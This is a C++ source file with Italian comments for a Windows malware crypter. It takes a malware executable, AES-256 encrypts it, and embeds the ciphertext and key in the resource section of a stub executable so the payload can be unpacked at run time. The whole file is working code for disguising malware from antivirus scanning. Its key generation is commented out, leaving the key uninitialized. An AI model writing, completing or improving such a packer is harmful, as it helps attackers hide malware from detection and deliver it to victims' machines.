#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include <fstream>
#include <time.h>


using namespace std; // namespace std e' un insieme di funzioni e classi che ci permettono di scrivere codice piu' velocemente


//array che conterranno i raw byte del malware e dello stub
unsigned char* malware;
unsigned char* stub;

int AESEncrypt(unsigned char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
            return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
            return -1;
        }

        DWORD dwBufLen = (DWORD)payload_len;
        if (!CryptEncrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *)payload, &dwBufLen, dwBufLen)){
            return -1;
        }

        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}

int AESDecrypt(unsigned char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
            return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
            return -1;
        }

        DWORD dwBufLen = (DWORD)payload_len;
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &dwBufLen)){
            return -1;
        }

        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}


int main(int argc, char* argv[]){
    char * malwarePath = argv[1];

    FILE* pMalware;
    FILE* pStub;
    long malwareLen;
    long stubLen;

    unsigned char key[32];
    srand((unsigned int)time(NULL));

   /*
  for(int i = 0; i< 32; i++){
        key[i] = (unsigned char) (rand() % 256);
        printf("chiave: %x\n", key[i]);
    }
   */ 


    //////////////////////////////
    //Questa routine permette di aprire un file come sequenza di byte, prenderne
    //prendo il path del malware da lina di comando e lo apro in modalita' read-byte 
    pMalware = fopen(malwarePath, "rb");  // Open the file in binary mode
    fseek(pMalware, 0, SEEK_END);          // Jump to the end of the file
    malwareLen = ftell(pMalware);          // Get the current byte offset in the file
    rewind(pMalware);                      // Jump back to the beginning of the file
    malware = new unsigned char[malwareLen];
    fread(malware, malwareLen, 1, pMalware);   // Read in the entire file
    fclose(pMalware);
    //////////////////////////////
    //prendo il path dello stub  lo apro in modalita' read-byte 

    pStub = fopen("mio_stub.exe", "rb");  // Open the file in binary mode
    fseek(pStub, 0, SEEK_END);          // Jump to the end of the file
    stubLen = ftell(pStub);          // Get the current byte offset in the file
    rewind(pStub);                      // Jump back to the beginning of the file
    stub = new unsigned char[stubLen];

    fread(stub, stubLen, 1, pStub);   // Read in the entire file
    fclose(pStub);

    //////////////////////////////
    //copio i raw bytes dei file malwere e stub in due array di unsigned char
    
    AESEncrypt(malware, malwareLen, (char *)key, sizeof(key)); //cripto in AES-256 il malware


    //adesso dovremo aprire il file 'stub.exe' e aggiungere nella sua sezione resources (la .rsrc) il malware criptato

    HANDLE hUpdateRes;
    BOOL result;
    BOOL resultKey;
	

    hUpdateRes = BeginUpdateResource("mio_stub.exe", FALSE);
    if (hUpdateRes == NULL)
    {
        printf("impossibile aprire lo stub per scrivere le risorse");
        return 0;
    }
    //ringraziamo il cielo che in AES-256 la lunghezza dei byte originali e dei criptati e' la stessa
    //69 e' molto importante perche' e' l'ID della risorsa che andremo a creare, quindi nello stub dovremo usare lo stesso id_risorsa
    //(potevo dargli qualsiasi valore ma 69 e' figo), BIN e' il tipo di risorsa (ovvero raw bytes)
    result = UpdateResource(hUpdateRes, "BIN", MAKEINTRESOURCE(69), NULL, malware, malwareLen);
    resultKey = UpdateResource(hUpdateRes, "BIN", MAKEINTRESOURCE(420), NULL, key, sizeof(key));

    if(result == FALSE){
        printf("impossibile aggiungere il malware allo stub");
        return 0;
    }
    if(resultKey == FALSE){
        printf("impossibile aggiungere la chiave allo stub");
        return 0;
    }
    
    if (!EndUpdateResource(hUpdateRes, FALSE)){
        printf("impossibile salvare le modifiche");
        return 0;
    }

    printf("\n\n\nSUCCESSO\n\n\n");
    return 0;
}
